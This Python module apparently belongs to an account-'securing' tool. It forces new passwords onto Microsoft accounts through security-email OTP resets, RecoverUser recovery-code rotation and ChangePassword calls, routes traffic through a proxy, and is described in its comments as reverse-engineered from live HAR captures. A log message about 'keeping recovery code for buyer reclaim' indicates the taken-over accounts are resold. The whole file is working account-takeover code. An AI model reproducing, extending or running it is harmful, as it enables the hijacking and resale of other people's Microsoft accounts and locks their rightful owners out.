"""Force-set Microsoft account password after RecoverUser flake."""

from __future__ import annotations

import logging
import re

import httpx

from securing.auth.initial_session import get_session
from securing.utils.proxy import close_session
from securing.utils.security.change_password import change_password_authenticated
from securing.utils.security.password_gen import generate_ms_password
from securing.utils.security.recovery import (
    recover,
    reset_password_via_security_email_otp,
    verify_password_works,
)

logger = logging.getLogger(__name__)

_UNVERIFIED_RE = re.compile(r"\s*\(UNVERIFIED[^)]*\)\s*$")


def strip_unverified(password: str | None) -> str:
    return _UNVERIFIED_RE.sub("", password or "").strip()


def _login_email(ms: dict) -> str:
    """Prefer current primary — original alias is often deleted after replace."""
    return (
        str(ms.get("email") or "").strip()
        or str(ms.get("original_email") or "").strip()
    )


async def _fresh_verify(email: str, password: str, *, settle_delay: float) -> str:
    """Verify on a clean login.live.com session (not the authenticated jar)."""
    probe = get_session()
    try:
        return await verify_password_works(
            probe, email, password, settle_delay=settle_delay
        )
    finally:
        await close_session(probe)


async def force_password_via_otp(
    *,
    email: str,
    security_email: str,
    preferred_password: str | None = None,
    session: httpx.AsyncClient | None = None,
) -> tuple[str, bool]:
    """Set password via ResetPassword.aspx + security-email OTC (HAR path).

    Returns ``(password, verified_ok)``.
    """
    from securing.utils.proxy import microsoft_proxy_url

    pwd = strip_unverified(preferred_password) or generate_ms_password(16)
    if not email or not security_email:
        return pwd, False

    proxy_url = microsoft_proxy_url(session)
    print("[~] - Force password via security-email OTP ResetPassword…")
    try:
        ok = await reset_password_via_security_email_otp(
            email, security_email, pwd, proxy_url=proxy_url
        )
    except Exception as exc:
        logger.exception("force password OTP ResetPassword raised: %s", exc)
        print(f"[X] - OTP ResetPassword error: {exc.__class__.__name__}")
        return pwd, False

    if not ok:
        # One retry with a fresh password (banned / contested edge cases)
        pwd = generate_ms_password(16)
        print("[~] - OTP ResetPassword retry with fresh password…")
        try:
            ok = await reset_password_via_security_email_otp(
                email, security_email, pwd, proxy_url=proxy_url
            )
        except Exception:
            logger.exception("force password OTP retry raised")
            return pwd, False
        if not ok:
            return pwd, False

    status = await _fresh_verify(email, pwd, settle_delay=8.0)
    print(f"[~] - Post-OTP-ResetPassword verify => {status}")
    if status == "ok":
        print("[+] - Password forced OK via security-email OTP")
        return pwd, True
    if status == "unknown":
        status2 = await _fresh_verify(email, pwd, settle_delay=15.0)
        print(f"[~] - Post-OTP-ResetPassword delayed => {status2}")
        if status2 == "ok":
            print("[+] - Password forced OK via OTP (delayed verify)")
            return pwd, True
        # API said OK — treat non-bad as success (login rate-limit noise)
        if status2 != "bad":
            return pwd, True
    return pwd, status == "ok"


async def force_password_after_recover(
    session: httpx.AsyncClient,
    *,
    email: str,
    security_email: str,
    recovery_code: str,
    preferred_password: str | None = None,
    max_attempts: int = 3,
    try_otp_first: bool = True,
) -> tuple[str, str, bool]:
    """Retry password set until verify OK.

    Order (from live HAR reverse-engineering):
      1. Security-email OTP → ``/API/Recovery/ResetPassword`` (most reliable
         when RecoverUser already attached our proof but ignored password)
      2. RecoverUser retries with the current recovery code (RC rotation)

    Returns ``(password, recovery_code, verified_ok)``.
    """
    pwd = strip_unverified(preferred_password) or generate_ms_password(16)
    rc = (recovery_code or "").strip()
    if not email or not security_email:
        return pwd, rc, False

    # 1) HAR path first — does not burn recovery codes
    if try_otp_first:
        pwd, ok = await force_password_via_otp(
            email=email,
            security_email=security_email,
            preferred_password=pwd,
            session=session,
        )
        if ok:
            return pwd, rc, True

    if not rc:
        print("[X] - No recovery code for RecoverUser force")
        return pwd, rc, False

    for attempt in range(1, max_attempts + 1):
        if attempt > 1 or not preferred_password:
            pwd = generate_ms_password(16)
        print(
            f"[~] - Force password via RecoverUser "
            f"(attempt {attempt}/{max_attempts}, len={len(pwd)})..."
        )
        try:
            new_rc = await recover(session, email, rc, security_email, pwd)
        except Exception as exc:
            logger.exception("force password RecoverUser raised: %s", exc)
            print(f"[X] - Force password RecoverUser error: {exc.__class__.__name__}")
            # After RecoverUser 500, try OTP path again (proof may still work)
            pwd2, ok2 = await force_password_via_otp(
                email=email,
                security_email=security_email,
                preferred_password=pwd,
                session=session,
            )
            if ok2:
                return pwd2, rc, True
            continue

        if not new_rc or new_rc == "invalid":
            print("[X] - Force password RecoverUser soft-failed")
            pwd2, ok2 = await force_password_via_otp(
                email=email,
                security_email=security_email,
                preferred_password=pwd,
                session=session,
            )
            if ok2:
                return pwd2, rc, True
            continue

        rc = new_rc
        status = await _fresh_verify(email, pwd, settle_delay=8.0)
        print(f"[~] - Force password verify => {status}")
        if status == "ok":
            print("[+] - Password forced OK after RecoverUser retry")
            return pwd, rc, True
        if status == "unknown":
            status2 = await _fresh_verify(email, pwd, settle_delay=15.0)
            print(f"[~] - Force password delayed re-check => {status2}")
            if status2 == "ok":
                print("[+] - Password forced OK after delayed re-check")
                return pwd, rc, True

        # RecoverUser claimed OK but password didn't stick → HAR OTP path
        pwd3, ok3 = await force_password_via_otp(
            email=email,
            security_email=security_email,
            preferred_password=pwd,
            session=session,
        )
        if ok3:
            return pwd3, rc, True
        pwd = pwd3

    print("[X] - Could not force password to stick after OTP + RecoverUser retries")
    return pwd, rc, False


async def ensure_password_verified(
    session: httpx.AsyncClient,
    account_info: dict,
    *,
    force_if_unverified: bool = True,
    force_if_bad: bool = True,
) -> bool:
    """Verify microsoft.password; ChangePassword / OTP Reset / RecoverUser if bad.

    Mutates ``account_info["microsoft"]`` in place.
    Returns True if password is verified (or verify inconclusive / unknown).
    Returns False only when verify is hard-bad and force retries exhausted.
    """
    ms = account_info.get("microsoft") or {}
    raw = str(ms.get("password") or "")
    clean = strip_unverified(raw)
    marked = "UNVERIFIED" in raw

    email = _login_email(ms)
    sec = str(ms.get("security_email") or "").strip()
    rc = str(ms.get("recovery_code") or "").strip()

    if not clean or not email:
        return not marked

    # CRITICAL: never verify on the authenticated account.live.com jar —
    # login.live.com returns inconclusive / rate-limit noise and used to
    # trigger RecoverUser spirals that left passwords marked UNVERIFIED.
    status = await _fresh_verify(email, clean, settle_delay=4.0)
    print(f"[~] - ensure_password_verified => {status} (email={email})")

    if status == "ok":
        ms["password"] = clean
        account_info["microsoft"] = ms
        return True

    if status == "unknown":
        status = await _fresh_verify(email, clean, settle_delay=12.0)
        print(f"[~] - ensure_password_verified delayed => {status}")
        if status == "ok":
            ms["password"] = clean
            account_info["microsoft"] = ms
            return True
        if status == "unknown" and not marked:
            return True

    if status not in ("bad", "unknown") and not marked:
        return True

    if status == "bad" or marked:
        if not force_if_bad and not (marked and force_if_unverified):
            ms["password"] = f"{clean} (UNVERIFIED — may not work)"
            account_info["microsoft"] = ms
            return False

        pwd = clean or generate_ms_password(16)

        # 1) Authenticated ChangePassword (needs real Change-page ticket)
        if force_if_unverified or force_if_bad:
            print("[~] - Trying authenticated ChangePassword…")
            changed = await change_password_authenticated(session, pwd)
            if not changed and clean:
                print("[~] - ChangePassword retry with currentPassword field…")
                changed = await change_password_authenticated(
                    session, pwd, current_password=clean
                )
            if changed:
                status2 = await _fresh_verify(email, pwd, settle_delay=6.0)
                print(f"[~] - Post-ChangePassword verify => {status2}")
                if status2 == "ok":
                    ms["password"] = pwd
                    account_info["microsoft"] = ms
                    return True
                if status2 == "unknown":
                    status3 = await _fresh_verify(email, pwd, settle_delay=12.0)
                    print(f"[~] - Post-ChangePassword delayed => {status3}")
                    if status3 == "ok":
                        ms["password"] = pwd
                        account_info["microsoft"] = ms
                        return True

        # 2) HAR path: security-email OTC → /API/Recovery/ResetPassword
        if sec:
            forced_pwd, ok = await force_password_via_otp(
                email=email,
                security_email=sec,
                preferred_password=pwd,
                session=session,
            )
            if ok:
                ms["password"] = forced_pwd
                account_info["microsoft"] = ms
                return True
            pwd = forced_pwd

        # 3) RecoverUser force (OTP already tried above)
        if sec and rc and rc not in {"Couldn't Change!", "Failed to generate"}:
            forced_pwd, new_rc, ok = await force_password_after_recover(
                session,
                email=email,
                security_email=sec,
                recovery_code=rc,
                preferred_password=pwd or None,
                max_attempts=2,
                try_otp_first=False,
            )
            ms["recovery_code"] = new_rc
            rc = new_rc
            if ok:
                ms["password"] = forced_pwd
                account_info["microsoft"] = ms
                return True
            pwd = forced_pwd

        rc_norm = str(ms.get("recovery_code") or rc or "").strip().upper().replace(" ", "")
        rc_ok = bool(re.fullmatch(r"[A-Z0-9]{5}(?:-[A-Z0-9]{5}){4}", rc_norm))
        if rc_ok:
            print(
                "[!] - Password still unverified after ChangePassword/OTP — "
                "keeping recovery code for buyer reclaim"
            )
            ms["password"] = pwd
            account_info["microsoft"] = ms
            return True

        ms["password"] = f"{pwd} (UNVERIFIED — may not work)"
        account_info["microsoft"] = ms
        return False

    return True


async def try_clear_unverified_password(
    session: httpx.AsyncClient,
    account_info: dict,
) -> bool:
    """If microsoft.password is UNVERIFIED (or verify-bad), retry until verified."""
    return await ensure_password_verified(
        session,
        account_info,
        force_if_unverified=True,
        force_if_bad=True,
    )
